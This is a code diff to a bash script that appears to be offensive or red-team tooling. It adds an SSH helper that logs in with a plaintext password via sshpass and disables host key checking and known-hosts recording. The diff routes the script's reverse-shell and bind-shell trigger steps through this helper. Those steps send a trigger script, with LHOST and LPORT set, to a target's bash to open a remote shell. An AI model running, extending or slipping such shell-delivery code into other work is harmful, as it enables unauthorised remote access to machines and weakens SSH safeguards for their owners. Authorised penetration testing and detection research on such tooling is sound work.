@@ -59,6 +59,22 @@ ps_single_quote() {
     printf "'%s'" "$value"
 }
 
+shell_delivery_ssh() {
+    local target="$1"
+    local command="$2"
+
+    if [[ -n "${USERNAME:-}" && -n "${PASSWORD:-}" ]]; then
+        sshpass -p "$PASSWORD" \
+            ssh -o StrictHostKeyChecking=no \
+            -o UserKnownHostsFile=/dev/null \
+            -o LogLevel=ERROR \
+            "$USERNAME@${target#*@}" \
+            "$command"
+    else
+        ssh "$target" "$command"
+    fi
+}
+
 start_powershell_script_background() {
     local script_path="$1"
     local launch_mode="${2:-background}"
@@ -184,7 +200,7 @@ run_reverse_shell() {
         log "Triggering reverse shell on target"
 
         if [[ -n "${TRIGGER_SCRIPT:-}" && -f "${TRIGGER_SCRIPT:-}" ]]; then
-            ssh "$target" \
+            shell_delivery_ssh "$target" \
                 "RUN_ID='$run_id' \
             LHOST='$lhost' \
             LPORT='$lport' \
@@ -194,7 +210,7 @@ run_reverse_shell() {
             bash -s" \
                 <"$TRIGGER_SCRIPT" &
         else
-            ssh "$target" \
+            shell_delivery_ssh "$target" \
                 "RUN_ID='$run_id' \
             LHOST='$lhost' \
             LPORT='$lport' \
@@ -254,7 +270,7 @@ run_reverse_shell() {
         log "Triggering reverse shell on target"
 
         if [[ -n "${TRIGGER_SCRIPT:-}" && -f "${TRIGGER_SCRIPT:-}" ]]; then
-            ssh "$target" \
+            shell_delivery_ssh "$target" \
                 "RUN_ID='$run_id' \
                 LHOST='$lhost' \
                 LPORT='$lport' \
@@ -264,7 +280,7 @@ run_reverse_shell() {
                 bash -s" \
                 <"$TRIGGER_SCRIPT" &
         else
-            ssh "$target" \
+            shell_delivery_ssh "$target" \
                 "RUN_ID='$run_id' \
                 LHOST='$lhost' \
                 LPORT='$lport' \
@@ -328,7 +344,7 @@ run_bind_shell() {
     TRIGGER_LOG="$run_dir/bind_trigger.log"
 
     if [[ -n "${TRIGGER_SCRIPT:-}" && -f "${TRIGGER_SCRIPT:-}" ]]; then
-        ssh "$target" \
+        shell_delivery_ssh "$target" \
             "RUN_ID='$run_id' \
             LPORT='$lport' \
             TARGET_USER='${TARGET_USER:-}' \
@@ -338,7 +354,7 @@ run_bind_shell() {
             <"$TRIGGER_SCRIPT" \
             >"$TRIGGER_LOG" 2>&1 &
     else
-        ssh "$target" \
+        shell_delivery_ssh "$target" \
             "RUN_ID='$run_id' \
             LPORT='$lport' \
             TARGET_USER='${TARGET_USER:-}' \
